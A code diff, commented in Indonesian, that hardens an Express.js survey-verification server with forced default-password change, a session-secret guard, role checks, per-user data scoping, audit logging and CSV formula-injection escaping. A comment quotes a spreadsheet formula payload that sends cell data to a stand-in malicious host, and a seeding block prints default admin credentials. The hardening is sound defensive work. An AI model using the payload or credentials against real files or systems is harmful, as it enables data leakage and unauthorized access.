@@ -67,7 +67,13 @@ try {
       email: 'admin@bps.go.id',
       password: bcrypt.hashSync('bps12345', 10),
     });
+    // Password bawaan ini tercetak di konsol dan tertulis di dokumentasi, jadi
+    // harus dianggap sudah bocor sejak awal. Akun ditandai wajib ganti password
+    // pada login pertama supaya nilai bawaannya tidak pernah dipakai permanen.
+    const _admin = db.findUserByEmail('admin@bps.go.id');
+    if (_admin) db.tandaiHarusGantiPassword(_admin.id);
     console.log('[SEED] Akun default dibuat -> email: admin@bps.go.id | password: bps12345');
+    console.log('[SEED] Password ini WAJIB diganti saat login pertama.');
   }
 } catch (e) {
   console.error('[SEED] Dilewati:', e.message);
@@ -80,18 +86,52 @@ app.use(express.static(path.join(__dirname, 'public')));
 // --- SESSION & PASSPORT ------------------------------------------------------
 // PENGAMAN 1: sesi disimpan di SQLite (bukan memori) -> tahan restart & banyak user.
 const createSqliteStore = require('./config/sqlite-session-store');
+
+// --- GUARD KEAMANAN: SESSION_SECRET wajib ada & bukan nilai contoh -----------
+// Cookie sesi ditandatangani memakai kunci ini. Bila kunci diketahui publik
+// (mis. nilai default yang ikut ter-commit ke GitHub), penyerang dapat MEMALSUKAN
+// cookie login berisi id pengguna mana pun — termasuk akun Admin — tanpa password.
+// Karena itu server SENGAJA menolak start daripada diam-diam memakai kunci lemah.
+const _SECRET_TERLARANG = [
+  'rahasia-dev-harap-ganti-di-produksi',
+  'ganti-dengan-string-acak-yang-panjang-dan-unik',
+];
+const SESSION_SECRET = process.env.SESSION_SECRET || '';
+if (!SESSION_SECRET || _SECRET_TERLARANG.includes(SESSION_SECRET) || SESSION_SECRET.length < 16) {
+  console.error('\n============================================================');
+  console.error('[FATAL] SESSION_SECRET belum diisi dengan benar di file .env');
+  console.error('        Kunci ini menandatangani cookie login. Bila kosong,');
+  console.error('        memakai nilai contoh, atau terlalu pendek (<16 karakter),');
+  console.error('        penyerang bisa memalsukan sesi Admin tanpa password.');
+  console.error('');
+  console.error('        SOLUSI: buat kunci acak lalu isikan ke .env, contoh —');
+  console.error('          node -e "console.log(require(\'crypto\').randomBytes(48).toString(\'hex\'))"');
+  console.error('        lalu di .env:  SESSION_SECRET=<hasil perintah di atas>');
+  console.error('============================================================\n');
+  process.exit(1);
+}
+
 app.set('trust proxy', 1); // di belakang tunnel/proxy (Cloudflare) -> cookie Secure benar
 app.use(
   session({
     store: createSqliteStore(db.db),
-    secret: process.env.SESSION_SECRET || 'rahasia-dev-harap-ganti-di-produksi',
+    secret: SESSION_SECRET,
     resave: false,
     saveUninitialized: false,
     cookie: {
       maxAge: 1000 * 60 * 60 * 8,                 // sesi 8 jam
       httpOnly: true,                              // cookie tak bisa dibaca JavaScript (anti-XSS)
       sameSite: 'lax',
-      secure: process.env.COOKIE_SECURE === '1',   // set '1' di .env saat diakses via HTTPS/tunnel
+      // 'auto' = cookie ditandai Secure HANYA bila koneksinya memang HTTPS
+      // (dideteksi dari req.secure / header X-Forwarded-Proto milik tunnel).
+      //
+      // JANGAN kembalikan ke `true` permanen (mis. lewat COOKIE_SECURE=1):
+      // express-session TIDAK mengirim header Set-Cookie sama sekali bila
+      // cookie.secure=true tetapi koneksinya HTTP biasa. Akibatnya login via
+      // http://localhost seolah "berhasil lalu balik ke halaman login" —
+      // password benar dan sesi tercatat, tetapi browser tak pernah menerima
+      // cookienya. Dengan 'auto', lokal (HTTP) dan tunnel (HTTPS) sama-sama jalan.
+      secure: 'auto',
     },
   })
 );
@@ -150,7 +190,9 @@ app.post('/api/pakta', (req, res) => {
 // Gerbang: semua endpoint data DI BAWAH baris ini butuh pakta yang sudah disetujui.
 // Dikecualikan: /api/me, /api/pakta, /api/wa-status (tidak memuat data rahasia).
 app.use('/api', (req, res, next) => {
-  const bebas = ['/me', '/pakta', '/wa-status'];
+  // '/ganti-password' ikut dibebaskan: mengganti password sendiri bukan akses
+  // data rahasia, dan bila digerbang pakta maka alurnya bisa saling mengunci.
+  const bebas = ['/me', '/pakta', '/wa-status', '/ganti-password'];
   if (bebas.includes(req.path)) return next();
   const u = req.user || {};
   if (u.pakta_versi !== PAKTA_VERSI) {
@@ -166,7 +208,43 @@ app.use('/api', (req, res, next) => {
 app.get('/api/me', (req, res) => {
   const u = req.user || {};
   // ISU 1+4: kirim role & kegiatan aktif agar dashboard menyesuaikan tampilan
-  res.json({ nama: u.nama, email: u.email, role: u.role || 'PML', scope: req.scope });
+  res.json({
+    nama: u.nama, email: u.email, role: u.role || 'PML', scope: req.scope,
+    // Dashboard memakai penanda ini untuk memblokir tampilan sampai password diganti
+    harus_ganti_password: !!u.harus_ganti_password,
+  });
+});
+
+// Ganti password sendiri. Dipakai untuk mencabut password bawaan akun admin
+// (bps12345) yang tercetak di konsol/dokumentasi sehingga harus dianggap bocor.
+app.post('/api/ganti-password', (req, res) => {
+  const bcrypt = require('bcryptjs');
+  const u = req.user || {};
+  const { password_lama, password_baru } = req.body || {};
+
+  if (!password_lama || !password_baru) {
+    return res.status(400).json({ error: 'Password lama dan baru wajib diisi.' });
+  }
+  if (String(password_baru).length < 8) {
+    return res.status(400).json({ error: 'Password baru minimal 8 karakter.' });
+  }
+  if (String(password_baru) === String(password_lama)) {
+    return res.status(400).json({ error: 'Password baru harus berbeda dari password lama.' });
+  }
+  // Tolak nilai bawaan agar kewajiban ganti password tidak bisa "diakali"
+  if (['bps12345', 'admin', 'password', '12345678'].includes(String(password_baru).toLowerCase())) {
+    return res.status(400).json({ error: 'Password terlalu mudah ditebak. Gunakan kombinasi lain.' });
+  }
+
+  const akun = db.findUserByEmail(u.email);
+  if (!akun || !akun.password || !bcrypt.compareSync(String(password_lama), akun.password)) {
+    return res.status(401).json({ error: 'Password lama tidak cocok.' });
+  }
+
+  db.gantiPasswordSelesai(akun.id, bcrypt.hashSync(String(password_baru), 10));
+  if (req.user) req.user.harus_ganti_password = 0; // segarkan sesi berjalan
+  db.logAudit({ ...jejak(req), aksi: 'GANTI_PASSWORD', detail: 'ganti password mandiri' });
+  res.json({ ok: true, message: 'Password berhasil diganti.' });
 });
 
 // ISU 1: daftar kegiatan untuk pemilih di dashboard.
@@ -234,21 +312,25 @@ app.get('/api/reveal/:id', (req, res) => {
 // Jejak audit = alat pengawasan -> KHUSUS Admin (Bug: PML tak boleh lihat)
 app.get('/api/audit-log', requireRole('Admin'), (req, res) => res.json(db.getAuditLog(req.query.limit || 100)));
 
-// MITIGASI ISU 2: rekap provenance (asal-usul) data
-app.get('/api/rekap-sumber', (req, res) => res.json(db.getRekapSumber()));
+// MITIGASI ISU 2: rekap provenance (asal-usul) data — ISU 3: ikut scope pemanggil
+app.get('/api/rekap-sumber', (req, res) => res.json(db.getRekapSumberScoped(req.scope)));
 
 // MITIGASI ISU 2: pilih sampel acak dari data PENDING (bila kerangka tak lengkap)
+// ISU 3: sampel diambil hanya dari data milik pemanggil pada kegiatan aktif.
 app.post('/api/sample', (req, res) => {
   const n = Number(req.body && req.body.jumlah) || 10;
-  const ids = db.getSampleIds(n);
+  const ids = db.getSampleIdsScoped(n, req.scope);
   db.logAudit({ ...jejak(req), aksi: 'PILIH_SAMPEL', detail: `sampel acak ${ids.length} baris`, jumlah: ids.length });
   res.json({ ok: true, ids, jumlah: ids.length });
 });
 
-// MITIGASI ISU 1: pemusnahan nomor sesuai kebijakan retensi
-app.post('/api/purge', (req, res) => {
+// MITIGASI ISU 1: pemusnahan nomor sesuai kebijakan retensi.
+// KHUSUS ADMIN: tindakan ini permanen. Sebelumnya endpoint ini tidak memeriksa
+// peran sama sekali — hanya tombolnya yang disembunyikan di UI — sehingga PML mana
+// pun bisa memanggilnya langsung. ISU 3: kini juga dibatasi ke kegiatan aktif.
+app.post('/api/purge', requireRole('Admin'), (req, res) => {
   const hari = req.body && req.body.hari !== undefined ? Number(req.body.hari) : 30;
-  const n = db.purgeNomorLama(hari);
+  const n = db.purgeNomorLamaScoped(hari, req.scope);
   db.logAudit({ ...jejak(req), aksi: 'MUSNAHKAN_NOMOR', detail: `retensi ${hari} hari`, jumlah: n });
   res.json({ ok: true, jumlah: n, message: `${n} nomor telah dimusnahkan (retensi ${hari} hari).` });
 });
@@ -382,10 +464,23 @@ app.post('/api/blast', (req, res) => {
 // Mengembalikan responden ke status PENDING agar bisa di-blast lagi.
 // Body opsional { id: <number> } untuk reset satu baris; tanpa id = reset semua.
 // -----------------------------------------------------------------------------
+// ISU 3: reset dibatasi ke kegiatan aktif (dan, bagi PML, ke barisnya sendiri).
+// Sebelumnya `id` dipakai apa adanya dari body tanpa penjaga kepemilikan, sehingga
+// satu PML bisa menghapus hasil verifikasi milik PML lain — atau seluruh tabel.
+// Aksi ini destruktif (VALID/FRAUD hilang) maka sekarang ikut dicatat di jejak audit.
 app.post('/api/reset', (req, res) => {
   const { id } = req.body || {};
-  const info = id ? db.resetOne(id) : db.resetAll();
+  if (id !== undefined && !Number.isFinite(Number(id))) {
+    return res.status(400).json({ error: 'Parameter id tidak valid.' });
+  }
+  const info = id !== undefined ? db.resetOneScoped(id, req.scope) : db.resetAllScoped(req.scope);
   const n = Number(info.changes || 0);
+  db.logAudit({
+    ...jejak(req),
+    aksi: 'RESET_STATUS',
+    detail: id !== undefined ? `reset 1 responden (id ${Number(id)})` : 'reset seluruh responden dalam kegiatan',
+    jumlah: n,
+  });
   console.log(`[RESET] ${n} responden dikembalikan ke status PENDING.`);
   res.json({ ok: true, changes: n });
 });
@@ -430,9 +525,19 @@ app.post('/api/resolve/:id', (req, res) => {
 // -----------------------------------------------------------------------------
 // FITUR 2: TEMPLATE & EKSPOR CSV
 // -----------------------------------------------------------------------------
-// Bungkus sel CSV: beri tanda kutip bila mengandung koma / kutip / baris baru
+// Bungkus sel CSV: beri tanda kutip bila mengandung koma / kutip / baris baru.
+//
+// KEAMANAN (CSV/Formula Injection): Excel & Google Sheets memperlakukan sel yang
+// diawali = + - @ (juga TAB/CR) sebagai RUMUS, bukan teks. Karena nama usaha &
+// nama petugas diisi pengguna, nilai seperti
+//   =HYPERLINK("http://situs-jahat/?c="&A1,"klik")
+// akan AKTIF di komputer Admin saat file ekspor dibuka — bisa membocorkan isi sel
+// lain. Solusi baku: sisipkan tanda kutip tunggal di depan sehingga dibaca sebagai
+// teks biasa. Catatan: nomor berformat "+62..." ikut diawali kutip — ini disengaja
+// dan tetap tampil benar sebagai teks di spreadsheet.
 function csvCell(v) {
-  const s = v === null || v === undefined ? '' : String(v);
+  let s = v === null || v === undefined ? '' : String(v);
+  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
   return /[",\n\r]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
 }
 function csvRow(arr) {
@@ -456,8 +561,12 @@ app.get('/api/export-report', (req, res) => {
   // MITIGASI ISU 1:
   //  (a) Default ekspor TER-MASKING. Nomor penuh hanya bila ?penuh=1 (tercatat di audit).
   //  (b) WATERMARK: identitas pengunduh + waktu ditanam di file, agar kebocoran terlacak.
+  //  (c) ISU 3: ekspor WAJIB ter-scope. Sebelumnya memakai db.getAll() tanpa filter,
+  //      sehingga PML mana pun bisa mengunduh SELURUH data lintas kegiatan & lintas
+  //      PML — dan dengan ?penuh=1 ikut mendapat nomor asli yang tidak tersamar.
+  //      Admin tetap memperoleh seluruh baris pada kegiatan aktif (pml_id = null).
   const penuh = req.query.penuh === '1';
-  const rows = db.getAll();
+  const rows = db.getAllScoped(req.scope);
   const j = jejak(req);
 
   const watermark =
